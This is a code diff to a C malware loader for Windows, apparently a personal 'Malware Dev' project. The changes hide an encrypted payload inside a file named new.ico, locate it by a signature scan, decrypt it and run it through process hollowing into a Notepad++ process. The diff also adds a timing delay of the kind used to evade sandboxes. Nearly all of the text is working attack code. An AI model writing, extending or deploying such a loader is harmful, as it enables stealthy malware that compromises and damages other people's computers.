@@ -13,10 +13,11 @@
 #pragma warning (disable:4996)
 //#define VMCHECK
 #define DEBUG
+#define READ
 #define TARGET_PROCESS_NAME          L"\\??\\C:\\Program Files\\Notepad++\\notepad++.exe"
-#define TARGET_PROCESS_PARAMETERS L" \"C:\\Program Files\\Notepad++\\notepad++.exe\" \"C:\\Users\\Acer\\Desktop\\Final Test.docx\""
+#define TARGET_PROCESS_PARAMETERS L" \"C:\\Program Files\\Notepad++\\notepad++.exe\" \"C:\\Users\\Acer\\Desktop\\branchtstabee.txt\""
 #define TARGET_PROCESS_PATH          L"C:\\Program Files\\Notepad++"
-#define PAYLOAD                        "E:\\Study\\Malware Dev\\data2.kiendt"
+#define PAYLOAD                        "new.ico"
 //#define PAYLOAD2                      MAKEINTRESOURCE(101) // Resource ID for the embedded payload
 
 
@@ -248,7 +249,8 @@ BOOL ReadFileFromDisk(IN LPCSTR cFileName, OUT PBYTE* ppBuffer, OUT PDWORD pdwFi
 	HANDLE	hFile = INVALID_HANDLE_VALUE;
 	PBYTE	pBufer = NULL;
 	DWORD	dwFileSize = 0x00,
-		dwNumberOfBytesRead = 0x00;
+			dwNumberOfBytesRead = 0x00,
+			payloadOffset = 0x00;
 
 	if ((hFile = CreateFileA(cFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
 		PRINT_WINAPI_ERR("CreateFileA");
@@ -271,9 +273,33 @@ BOOL ReadFileFromDisk(IN LPCSTR cFileName, OUT PBYTE* ppBuffer, OUT PDWORD pdwFi
 	}
 
 	// Locate the payload 
+	for (DWORD i = 0; i <= dwFileSize - SIGNATURE_LEN; i++) {
+		if (memcmp(&pBufer[i], SIGNATURE, SIGNATURE_LEN) == 0) {
+			payloadOffset = i;
+			break;
+		}
+	}
 
+	if (payloadOffset == 0 && memcmp(pBufer, SIGNATURE, SIGNATURE_LEN) != 0) {
+		printf("[-] Signature not found in the file.\n");
+		goto _FUNC_CLEANUP;
+	}
 
-	if (!Decryption(pBufer, dwFileSize, Key, IV, (PVOID*)ppBuffer, pdwFileSize)) {
+	PBYTE pPayloadStart = &pBufer[payloadOffset];
+	DWORD payloadSize = dwFileSize - payloadOffset;
+
+	PBYTE pEncryptedPayload = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payloadSize);
+	if (!pEncryptedPayload) {
+		PRINT_WINAPI_ERR("HeapAlloc - Payload");
+		goto _FUNC_CLEANUP;
+	}
+
+	memcpy(pEncryptedPayload, pBufer + payloadOffset, payloadSize);
+	printf("[i] Signature found at offset %lu, payload size: %lu bytes, Newly allocated address: %p.\n",
+		payloadOffset, payloadSize, pEncryptedPayload);
+
+	printf("[i] Decrypting payload...\n");
+	if (!Decryption(pEncryptedPayload, payloadSize, Key, IV, (PVOID*)ppBuffer, pdwFileSize)) {
 		PRINT_WINAPI_ERR("Decryption");
 		goto _FUNC_CLEANUP;
 	}
@@ -684,9 +710,9 @@ BOOL RemotePEExec(IN HANDLE hParentProcess, IN PBYTE pPeBuffer, IN DWORD dwImage
 #ifdef DEBUG
 	printf("[+] Thread resumed at EntryPoint: %p\n", (PVOID)Context.Rcx);
 #endif
-
+	BOOL nothing2 = MathDelayFunction(3.0);
 	// Wait for completion
-	WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
+	//WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
 
 #ifdef DEBUG
 	printf("[*] Reading output...\n\n");
@@ -845,6 +871,7 @@ int main() {
 	PBYTE pPeBuffer = NULL;
 	DWORD dwPeFileSize = 0;
 
+#ifdef READ
 	if (!ReadFileFromDisk(PAYLOAD, &pPeBuffer, &dwPeFileSize)) {
 #ifdef DEBUG
 		printf("[-] Failed to read the PE file from disk.\n");
@@ -852,6 +879,7 @@ int main() {
 		DELETE_HANDLE(hParentProcess);
 		return -1;
 	}
+#endif // READ
 
 	// Extract resource payload
 #ifdef LOADSRSC
